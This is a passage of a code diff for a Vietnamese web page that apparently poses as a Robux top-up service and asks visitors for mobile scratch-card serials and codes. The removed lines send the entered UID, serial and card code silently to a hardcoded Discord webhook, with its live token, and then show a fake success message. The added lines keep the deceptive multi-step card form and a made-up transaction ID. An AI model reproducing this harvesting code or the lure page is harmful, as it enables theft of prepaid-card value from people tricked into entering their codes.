-                           now.getMinutes().toString().padStart(2, '0') + ' ' + 
-                           now.getDate().toString().padStart(2, '0') + '/' + 
-                           (now.getMonth() + 1).toString().padStart(2, '0') + '/' + 
-                           now.getFullYear();
-
-        // Cấu hình link Webhook Discord của bạn
-        const webhookUrl = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";
-
-        // Tạo nội dung gửi lên kênh Discord
-        const discordPayload = {
-            content: "🔔 **CÓ ĐƠN NẠP ROBUX MỚI XỬ LÝ!**",
-            embeds: [{
-                title: "Chi Tiết Thẻ Nạp Hệ Thống",
-                color: 3432248, // Màu xanh lục tiệp với web
-                fields: [
-                    { name: "👤 Tài khoản / UID", value: uid, inline: true },
-                    { name: "💳 Nhà mạng", value: "Viettel", inline: true },
-                    { name: "💰 Gói nạp", value: selectedWebhookText, inline: false },
-                    { name: "📌 Số Seri", value: seri, inline: true },
-                    { name: "🔑 Mã Thẻ nạp", value: ma, inline: true },
-                    { name: "⏰ Thời gian gửi", value: timeString, inline: false }
-                ],
-                footer: {
-                    text: "Hệ thống quản lý napx10"
+        // Hàm cập nhật thanh tiến trình
+        function updateProgress(stepNumber) {
+            // Reset tất cả các bước
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById('progress' + i).classList.remove('active');
+            }
+            // Tô màu xanh cho các bước đã qua và bước hiện tại
+            for (let i = 1; i <= stepNumber; i++) {
+                if (i <= 4) { // Chỉ có 4 bước trên thanh tiến trình
+                    document.getElementById('progress' + i).classList.add('active');
                 }
-            }]
-        };
+            }
+        }
 
-        // Thực hiện gửi dữ liệu ngầm lên Discord bằng Fetch API
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(discordPayload)
-        })
-        .then(() => {
-            // Cập nhật thông tin xuống menu kết quả ở dưới
-            document.getElementById('resTime').innerText = timeString;
-            document.getElementById('resSeriMa').innerText = seri + " / " + ma;
-            document.getElementById('resRobux').innerText = menhGia;
+        // --- BƯỚC 1 -> 2 ---
+        function gotoStep2() {
+            const usernameInput = document.getElementById('username');
+            if (usernameInput.value.trim() === "") {
+                alert("Vui lòng nhập Username Roblox!");
+                return;
+            }
+            selectedUsername = usernameInput.value;
+            hideAllSteps();
+            document.getElementById('step2').style.display = 'block';
+            updateProgress(2);
+        }
 
-            // Hiển thị menu thông báo lên màn hình
-            document.getElementById('successBox').style.display = 'block';
+        // --- BƯỚC 2 -> 3 ---
+        function selectPackage(packageName, packagePrice) {
+            selectedPackageName = packageName;
+            selectedPackagePrice = packagePrice;
 
-            // Xóa sạch dữ liệu cũ trong form để chuẩn bị lượt nhập tiếp theo
-            document.getElementById('uidInput').value = "";
-            document.getElementById('seriInput').value = "";
-            document.getElementById('maInput').value = "";
-            menhGiaInput.value = "";
-        })
-        .catch((error) => {
-            console.error('Lỗi Webhook:', error);
-            alert('Có lỗi mạng xảy ra khi kết nối hệ thống. Vui lòng thử lại!');
-        });
-    });
-</script>
+            // Cập nhật thông tin hiển thị ở Bước 3 & 4
+            document.getElementById('display-package').innerText = packageName;
+            document.getElementById('final-package-name').innerText = packageName;
+            document.getElementById('final-package-price').innerText = packagePrice;
 
+            // Cập nhật mệnh giá ở Bước 3
+            document.getElementById('method-price-viettel').innerText = packageName;
+            document.getElementById('method-price-vinaphone').innerText = packageName;
+            document.getElementById('method-price-mobifone').innerText = packageName;
+            document.getElementById('method-price-zing').innerText = packageName;
+
+            hideAllSteps();
+            document.getElementById('step3').style.display = 'block';
+            updateProgress(3);
+        }
+
+        // --- BƯỚC 3 -> 4 ---
+        function selectMethod(methodName) {
+            selectedMethodName = methodName;
+            document.getElementById('final-method-name').innerText = "Thẻ " + methodName;
+
+            hideAllSteps();
+            document.getElementById('step4').style.display = 'block';
+            updateProgress(4);
+        }
+
+        // Quay lại Bước 3 từ Bước 4
+        function goBackToStep3() {
+            hideAllSteps();
+            document.getElementById('step3').style.display = 'block';
+            updateProgress(3);
+        }
+
+        // --- BƯỚC 4 -> 5 (Thanh toán Thất bại - Demo) ---
+        function gotoStep5() {
+            const serialInput = document.getElementById('serial');
+            const codeInput = document.getElementById('code');
+
+            if (serialInput.value.trim() === "" || codeInput.value.trim() === "") {
+                alert("Vui lòng nhập đầy đủ Số serial và Mã thẻ!");
+                return;
+            }
+
+            // Tự tạo một ID giao dịch giả lập
+            document.getElementById('transaction-id').innerText = Math.floor(Math.random() * 9000000000) + 1000000000;
+
+            // Cập nhật bảng kết quả
+            document.getElementById('res-username').innerText = selectedUsername;
+            document.getElementById('res-method').innerText = "Thẻ " + selectedMethodName;
+            document.getElementById('res-package').innerText = selectedPackageName;
+            document.getElementById('res-price').innerText = selectedPackagePrice;
+
+            // Lấy thời gian hiện tại
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const day = String(now.getDate()).padStart(2, '0');
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const year = now.getFullYear();
+            document.getElementById('res-time').innerText = hours + ":" + minutes + " " + day + "/" + month + "/" + year;
+
+            hideAllSteps();
+            document.getElementById('step5').style.display = 'block';
+            updateProgress(4); // Vẫn giữ bước 4 active vì đây là màn hình kết quả sau bước 4
+        }
+    </script>
 </body>
 </html>
 
